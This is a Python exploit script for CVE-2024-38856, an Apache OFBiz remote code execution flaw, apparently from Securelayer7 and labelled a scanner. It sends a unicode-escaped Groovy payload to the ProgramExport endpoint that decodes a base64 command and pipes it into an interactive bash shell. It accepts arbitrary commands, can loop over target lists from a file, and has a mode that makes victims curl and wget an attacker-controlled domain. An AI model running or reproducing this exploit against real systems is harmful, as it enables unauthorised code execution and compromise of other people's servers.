import sys
import base64
import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def getLogo():
    logo ="""

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗     ██████╗  █████╗  █████╗ ███████╗ ██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║     ╚════██╗██╔══██╗██╔══██╗██╔════╝██╔════╝ 
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗█████╔╝╚█████╔╝╚█████╔╝███████╗███████╗ 
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝╚═══██╗██╔══██╗██╔══██╗╚════██║██╔═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║     ██████╔╝╚█████╔╝╚█████╔╝███████║╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝     ╚═════╝  ╚════╝  ╚════╝ ╚══════╝ ╚═════╝ 
                                                                                                            
                                                                                                                                                           
                                                                                                                                                              
                    Github: https://github.com/securelayer7/CVE-2024-38856_Scanner
                                By: Securelayer7(yosef0x01 & Zeyad Azima)                                     
"""
    print(logo)

def commandEncoder(command):
    encodedCommand = base64.b64encode(command.encode()).decode()
    return encodedCommand

def payloadUnicode(base64EncodedCommand):
    payload = f'["bash", "-c", "{{echo,{base64EncodedCommand}}}|{{base64,-d}}|{{bash,-i}}"].execute()'
    unicodePayload = ''.join(f'\\u{ord(c):04x}' for c in payload)
    return unicodePayload

def exploit(target, port, payload):
    url = f'{target}:{port}/webtools/control/main/ProgramExport'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = r"groovyProgram="+payload
    try:
    	response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
    	return response.status_code, response.text
    except Exception as e:
    	print(f"Exception: {e}")
    	return "target maybe down", ""
    

def processTarget(target, port, command):
    encodedCommand = commandEncoder(command)
    unicodePayload = payloadUnicode(encodedCommand)
    statusCode, responseText = exploit(target, port, unicodePayload)
    if statusCode == 200:
        print("[!] Target maybe vulnerable")
        print(f"\t[+] Target: {target}, Port: {port}")
        print(f"\t[+] Status Code: {statusCode}")
        print(f"\t[+] Command: {command}\n\n")
    elif statusCode == 400:
        print("[!] Target have to use 'https':")
        print(f"\t[-] Target: {target}, Port: {port}")
        print(f"\t[-] Status Code: {statusCode}\n\n")
    else:
        print("[!] Target may not be vulnerable:")
        print(f"\t[-] Target: {target}, Port: {port}")
        print(f"\t[-] Status Code: {statusCode}\n\n")
    

def main():
    parser = argparse.ArgumentParser(description='CVE-2024-38856 Apach Ofbiz RCE Scanners.')
    parser.add_argument('-t', '--target', type=str, help='Target host')
    parser.add_argument('-p', '--port', type=int, help='Target port')
    parser.add_argument('-c', '--command', type=str, help='Command to execute')
    parser.add_argument('-s', '--scan', action='store_true', help='Perform scan with ping, curl, and wget')
    parser.add_argument('-d', '--domain', type=str, help='Domain (attacker domain) to scan with ping, curl, and wget')
    parser.add_argument('-f', '--file', type=str, help='File containing a list of targets in the format http(s)://target,port')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    print("[*] Options Passed:")
    for arg in vars(args):
        print(f"    {arg}: {getattr(args, arg)}")
      
    prefix = ""
    print("\n")
    if args.file:
        if args.target:
            print("[!] Error: --target cannot be used with --file")
            sys.exit(1)
        if not (args.command or (args.scan and args.domain)):
            print("[!] Error: --file requires either --command or --scan with --domain")
            sys.exit(1)
        
        with open(args.file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    if not (line.startswith("http://") or line.startswith("https://")):
                        if not prefix:
                            choice = input("Targets do not have http:// or https:// prefix. Choose one to add to all targets:\n1. http://\n2. https://\nChoice (1/2): ")
                            if choice == '1':
                                prefix = "http://"
                            elif choice == '2':
                                prefix = "https://"
                            else:
                                print("[!] Invalid choice.")
                                sys.exit(1)
                        line = prefix + line
                    
                    if "," in line:
                        target, port = line.split(",")
                        port = int(port)
                    else:
                        target = line
                        if not args.port:
                            print("[!] Error: --port must be specified if not included in the file")
                            sys.exit(1)
                        port = args.port

                    if args.scan:
                        scanCommands = [
                            f'ping -c 4 {args.domain}',
                            f'curl {args.domain}',
                            f'wget {args.domain}'
                        ]
                        for command in scanCommands:
                            processTarget(target, port, command)
                    else:
                        processTarget(target, port, args.command)
    else:
        if args.scan:
            if not args.domain:
                print("[!] Error: --domain is required when --scan is specified")
                sys.exit(1)
            scanCommands = [
                f'ping -c 4 {args.domain}',
                f'curl {args.domain}',
                f'wget {args.domain}'
            ]
            for command in scanCommands:
                processTarget(args.target, args.port, command)
        else:
            if not args.command:
                print("[!] Error: --command is required if --scan is not specified")
                sys.exit(1)
            processTarget(args.target, args.port, args.command)

if __name__ == "__main__":
    getLogo()
    main()
